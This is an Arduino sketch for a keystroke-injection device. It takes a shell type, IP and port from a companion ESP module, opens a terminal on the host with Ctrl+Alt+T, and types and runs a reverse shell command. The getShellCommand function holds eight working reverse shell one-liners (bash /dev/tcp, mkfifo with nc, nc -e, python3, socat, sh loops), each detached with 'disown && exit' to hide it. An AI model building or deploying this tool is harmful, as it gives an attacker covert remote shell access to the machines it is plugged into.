#include <Keyboard.h>
#include <ArduinoJson.h>
#include <SoftwareSerial.h>


// Define RX and TX pins for SoftwareSerial communication
int rxPin = 14;  // RX pin for receiving data from ESP
int txPin = 16;  // TX pin for sending data to ESP

// Define the buffer size for the JSON document
#define JSON_BUFFER_SIZE 512

// Initialize SoftwareSerial object
SoftwareSerial mySerial(rxPin, txPin);

char result[256];  // Declare the array to store the data
int i = 0;

// Declare the run_command variable
String commandStr = "";  // Rename the variable to avoid conflict with the function

void setup() {
    delay(5000);
  
    Serial.begin(115200);  // Starts serial communication with the computer
    
    //while (!Serial) {
    //   ; // wait for serial port to connect. Needed for native USB port only
    //}
    // Start booting sequence without excessive printing
    
    Serial.print("Initializing...");
    for (int i = 0; i < 3; i++) {  // Reduced delay steps to minimize resource usage
        delay(500);
        Serial.print(".");
    }
  
    // Simulate system check steps
    Serial.println("\nChecking components...\n");

  
    // Display board information with reduced verbosity
    #ifdef ARDUINO_AVR_UNO
        Serial.println("Board: Arduino Uno");
    #elif defined(ARDUINO_AVR_NANO)
        Serial.println("Board: Arduino Nano");
    #elif defined(ARDUINO_MEGA2560)
        Serial.println("Board: Arduino Mega 2560");
    #else
        Serial.println("Board: Unknown");
    #endif

  
    delay(200);
  
    Keyboard.begin();    // Initializes the HID keyboard functionality
    mySerial.begin(9600); // Starts SoftwareSerial communication with the ESP device
    
    Serial.println("\nSystem ready.");
}

void loop() {
    if (mySerial.available()) {
        String jsonData = mySerial.readString(); // Read the full JSON string

        Serial.println("\n\n");
        Serial.println("**************************************");
        Serial.println("Received JSON from ESP: " + jsonData);

        // Parse the JSON data
        DynamicJsonDocument doc(JSON_BUFFER_SIZE);
        DeserializationError error = deserializeJson(doc, jsonData);

        if (error) {
            Serial.println("JSON parsing error: ");
            Serial.println(error.c_str());
            sendResponse(false);
            return;
        }

        // Extract values
        const char* shellType = doc["st"];
        const char* ipAddress = doc["ip"];
        const char* port = doc["p"];

        // Check for missing or null keys
        if (!shellType || !ipAddress || !port) {
            Serial.println("Error: Missing keys in JSON.");
        
            // Send a NACK response to the client
            sendResponse(false);
            return;
        } else {
          
            // Send a ACK response to the client
            sendResponse(true);
        }

        // Debug output
        Serial.println("Command: " + String(shellType));
        Serial.println("IP Address: " + String(ipAddress));
        Serial.println("Port: " + String(port));

        // Set run_command from JSON or use a default value
        run_command(shellType, ipAddress, port);

    }
}

void sendResponse(bool success) {
    DynamicJsonDocument doc(256);  // Manja veličina
    doc["status"] = success ? "ACK" : "NACK";  // Ternary operator
    String response;
    serializeJson(doc, response);
    mySerial.println(response);  // Send to SoftwareSerial
    Serial.println("Response: " + response);  // Debugging output
}


/*
 * Function: run_command
 * ---------------------
 * This function generates and executes a reverse shell command based on the provided shell type, IP address, and port. 
 * It supports multiple shell types, each with a unique command template, and dynamically substitutes the provided 
 * IP address and port into the command template.
 *
 * Parameters:
 *   - shellType: A constant character pointer indicating the type of shell to use (e.g., "bash", "python3", "nc").
 *   - ipAddress: A constant character pointer specifying the target IP address for the reverse shell connection.
 *   - port: A constant character pointer specifying the target port for the reverse shell connection.
 *
 * Implementation Details:
 *   1. Shell Commands Mapping:
 *      - A `std::map` is used to store pre-defined command templates for different shell types. 
 *      - Each command template contains placeholders `{IP}` and `{PORT}` to be replaced with the provided IP address and port.
 *
 *   2. Command Generation:
 *      - The function checks if the provided `shellType` exists in the `shellCommands` map.
 *      - If found, it retrieves the corresponding command template and replaces `{IP}` and `{PORT}` placeholders with the actual values.
 *      - If the `shellType` is not recognized, an error message is printed to the serial console.
 *
 *   3. Terminal Automation:
 *      - The function uses simulated key presses to open a terminal on the system.
 *      - The generated command is then typed into the terminal and executed using the Enter key.
 *
 *   4. Error Handling:
 *      - If the `shellType` is not valid or no command is generated, the function prints an error message to the serial console.
 *
 * Usage Example:
 *   run_command("bash", "192.168.1.100", "4444");
 *   - This will generate the command:
 *     `bash -i >& /dev/tcp/192.168.1.100/4444 0>&1`
 *   - It will then open the terminal and execute the command.
 */


// Get the shell command template
const char* getShellCommand(const char* shellType) {
    if (strcmp(shellType, "bash") == 0) {
        return "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1 & disown && exit";
    } else if (strcmp(shellType, "mkfifo") == 0) {
        return "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|sh -i 2>&1|nc {IP} {PORT} >/tmp/f";
    } else if (strcmp(shellType, "nc") == 0) {
        return "nc -e /bin/sh {IP} {PORT} & disown && exit";
    } else if (strcmp(shellType, "python3") == 0) {
        return "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{IP}\",{PORT}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")' & disown && exit";
    } else if (strcmp(shellType, "socat") == 0) {
        return "socat TCP:{IP}:{PORT} EXEC:sh & disown && exit";
    } else if (strcmp(shellType, "socat-tty") == 0) {
        return "socat TCP:{IP}:{PORT} EXEC:'sh',pty,stderr,setsid,sigint,sane & disown && exit";
    } else if (strcmp(shellType, "sh-196") == 0) {
        return "0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; sh <&196 >&196 2>&196 & disown && exit";
    } else if (strcmp(shellType, "sh-loop") == 0) {
        return "exec 5<>/dev/tcp/{IP}/{PORT}; while read line 0<&5; do $line 2>&5 >&5; done & disown && exit";
    } else {
        return NULL;  // Return NULL if the shell type is not recognized
    }
}

// Helper function to replace {IP} and {PORT} in the command template
String replacePlaceholders(String templateStr, const char* IP, const char* PORT) {
    templateStr.replace("{IP}", IP);
    templateStr.replace("{PORT}", PORT);
    return templateStr;
}


// Run the command
void run_command(const char* shellType, const char* ipAddress, const char* port) {
    const char* commandTemplate = getShellCommand(shellType);

    if (commandTemplate != NULL) {
        // Replace placeholders in the command template
        String command = replacePlaceholders(String(commandTemplate), ipAddress, port);

        // Print the generated command
        Serial.println("Generated command: " + command);

        // Simulate key presses to open terminal and send the command
        delay(5000);
        Keyboard.press(KEY_LEFT_CTRL);  // Press Left CTRL key
        Keyboard.press(KEY_LEFT_ALT);   // Press Left ALT key
        Keyboard.press('t');            // Press 't' key (for terminal)

 
        //Keyboard.press(KEY_LEFT_ALT);   // Press Left ALT key
        //Keyboard.press(KEY_RETURN);     // Press Enter key
        delay(100);                     // Wait for the key press to register
        Keyboard.releaseAll();          // Release all pressed keys

        delay(1000);                    // Wait 1 second to allow the terminal to open

        // Send the command to the terminal
        Keyboard.print(command);        // Types the command
        Keyboard.press(KEY_RETURN);     // Press Enter key
        delay(100);                     // Wait for the key press to register
        Keyboard.releaseAll();          // Release all pressed keys
    } else {
        // If the shell type is not found, print an error message
        Serial.println("Error: Unknown shell type.");
    }
}
